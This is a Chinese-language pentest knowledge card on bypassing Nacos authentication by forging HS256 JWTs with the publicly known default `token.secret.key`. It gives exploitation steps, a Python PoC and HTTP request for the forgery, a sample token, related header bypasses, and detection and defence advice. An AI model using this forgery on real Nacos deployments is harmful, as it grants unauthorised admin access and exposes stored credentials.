---
id: web-java-component-nacos-default-token-secret-key-jwt-forge
title: Nacos 默认 token.secret.key：用公开默认密钥 HS256 伪造 accessToken 绕过鉴权
type: scenario
domain: web
path: web/java/component
technique: nacos-default-token-secret-key-jwt-forgery
aliases:
- Nacos 默认 JWT 密钥
- nacos.core.auth.default.token.secret.key
- Nacos accessToken 伪造
- Nacos HS256 默认密钥
- QVD-2023-6271
tags:
- nacos
- java
- jwt
- auth-bypass
- default-secret
- component
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:05:41+08:00'
  notes: 已对照原文与全部35张图核对：默认token.secret.key=SecretKey0123...（图10/13）、jwt.io HS256伪造（图11）、exp改1711355100后带accessToken调用返回用户列表（图12）、文档说明2.2.1后默认值移除（图13）均一致。原文示例token payload exp:1已注明过期。未验证点：未实际对目标签发token；2.2.1+键名plugin.nacos.token.secret.key见原文serverIdentity段配置（图17）。
---

## 一句话结论

Nacos 开启鉴权后，若 `nacos.core.auth.default.token.secret.key`（2.2.1 后为 `nacos.core.auth.plugin.nacos.token.secret.key`）仍是官方默认值，则该 HS256 对称密钥是公开的；攻击者可用它自行签发 `{"sub":"nacos","exp":<未来时间>}` 的 JWT，作为 `accessToken` 参数或请求头提交，服务端验签通过后按已认证用户处理，从而未授权调用管理 API。

## 原理

- Nacos 的 accessToken 是 HS256 JWT，服务端用配置里的 `token.secret.key` 做 HMAC-SHA256 验签。HS256 是对称算法：签名与验签使用同一个密钥。
- 官方 `application.properties` 长期带有默认值 `SecretKey012345678901234567890123456789012345678901234567890123456789`（或 Base64 编码后的等价字符串）。部署者若不修改，攻击者无需任何泄露即可从官方文档/源码得到该密钥。
- 攻击者用该密钥签发任意 payload（如 `sub=nacos`、`exp` 为未来 Unix 时间），服务端验签时只检查签名与过期时间，不校验签发者，因此伪造 token 与合法 token 等价。
- Nacos 读取 accessToken 的常见方式：URL 参数 `?accessToken=<jwt>`，或 `Authorization: Bearer <jwt>` / 自定义 token 头（视版本与配置）。原文以 URL 参数演示。
- 为什么成立：默认密钥是“公开的秘密”，对称签名无法区分 token 由服务器还是攻击者签发；只要密钥没换，JWT 的完整性保护就失效。
- 边界：若部署者已修改密钥（推荐 Base64 编码且原始长度 ≥32 字符），伪造失败；若 `token.expire.seconds` 很短，需填入未过期的 `exp`；2.2.1 后配置项改名并移除默认值（不填则节点无法启动），需按版本选择键名。

## 触发条件

- 目标开启 Nacos 鉴权（`nacos.core.auth.enabled=true`）。
- `token.secret.key` 仍为默认值或可预测/已知值。
- 攻击者可访问 Nacos API（8848 或反代 `/nacos`），并能提交 `accessToken`。
- 目标版本与配置键名匹配（老版本 `nacos.core.auth.default.token.secret.key`，2.2.1+ 为 `nacos.core.auth.plugin.nacos.token.secret.key`，且常为 Base64）。

## 利用步骤

1. 确认鉴权已开启：请求 `/nacos/v1/auth/users` 返回 403 `unknown user!`。
2. 用默认密钥在本地生成 HS256 JWT：header `{"alg":"HS256"}`，payload `{"sub":"nacos","exp":<now+18000>}`，签名密钥为默认字符串。
3. 将 token 作为 `accessToken` 参数附加到管理 API：`GET /nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken=<jwt>`。
4. 若返回用户列表，说明伪造成功；随后可调用创建用户、配置读写等接口。
5. 若目标为 2.2.1+ 且使用 `plugin.nacos.token.secret.key`，先判断该值是否为官方示例的 Base64 串；是则用对应原始字节签名。
6. 记录 token 与响应作为证据，不进行破坏性操作。

## PoC

```python
import jwt, time
secret = "SecretKey012345678901234567890123456789012345678901234567890123456789"
token = jwt.encode({"sub": "nacos", "exp": int(time.time()) + 18000}, secret, algorithm="HS256")
print(token)
```

```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=9&accessToken=<token> HTTP/1.1
Host: target:8848
```

原文示例 token（payload 为 `{"sub":"nacos","exp":1}`，仅用于说明结构，已过期）：

```text
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MX0.prKBqb32hvYghIgxzSjzW2nbBn7TDjtYM49zEvxI38g
```

将 `exp` 改为未来 Unix 时间（原文示例 1711355100）后即可访问接口。在线 jwt.io 也可用默认密钥生成/验签。

## 变体与关联

- **默认密钥 + 配置读取**：伪造 token 后读取配置中心，常可拿到下游数据库/对象存储凭据，形成横向链（已有卡 [[pentest-lateral-movement-nacos-ua-bypass-config-minio-credentials]] 在 UA 绕过链中简要使用了同一默认密钥原语；本卡聚焦 token 伪造本身的配置项、键名差异与 PoC）。
- **User-Agent 白名单**：旧版本 `enable.userAgentAuthWhite=true` 时 `User-Agent: Nacos-Server` 也可直接绕过，无需密钥。
- **serverIdentity 头**：若 `server.identity.key/value` 为已知/弱值，带对应请求头同样可跳过 JWT。
- **算法混淆**：若目标使用非对称签名且校验实现不当，可尝试算法混淆；Nacos 默认是 HS256 对称密钥，不存在该问题。
- 关联：[[web-java-component-nacos-default-auth-disabled-user-admin]]、[[web-java-component-nacos-server-identity-header-auth-bypass]]。

## 检测与防御

- **检测**：JWT 的 `alg` 为 HS256 但签发时间/来源异常；同一 `sub` 出现大量不同 IP 的请求；请求 URL 直接携带 `accessToken=`；用户列表/配置 API 的异常访问。
- **防御**：部署时修改默认 `token.secret.key`（Base64 编码、原始长度 ≥32 字符，集群各节点一致）；升级到 2.2.1+ 并按新键名配置；不要把 Nacos 暴露公网；对管理 API 增加来源 IP 限制与审计。
- **注意**：仅开启 `nacos.core.auth.enabled=true` 而不换默认密钥，等于把签名密钥公开，仍然可被完全绕过。
